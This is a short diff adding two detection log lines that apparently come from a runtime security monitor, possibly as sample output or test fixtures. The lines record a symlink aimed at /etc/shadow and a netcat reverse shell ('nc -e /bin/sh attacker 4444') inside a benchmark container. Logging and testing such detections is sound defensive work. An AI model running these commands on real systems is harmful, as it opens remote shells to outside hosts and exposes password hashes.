@@ -1,0 +1,2 @@
+[2023-02-07T14:29:09Z  THREAT  /usr/bin/ln (36267)] [rules-engine - { rule_name = "Create sensitive files symlink" }] File Link { source: /tmp/secret, destination: /etc/shadow, hard_link: false }
+[2025-09-18T12:00:00Z THREAT ebpf-bench/victim:latest sha256:9b2f0c7e1d3a4b5c6d7e8f9a0b1c2d3e /usr/bin/nc (48211)] [rules-engine - Netcat Remote Code Execution in Container] Exec { filename: /usr/bin/nc, argc: 5, argv: [ nc, -e, /bin/sh, attacker, 4444 ] }
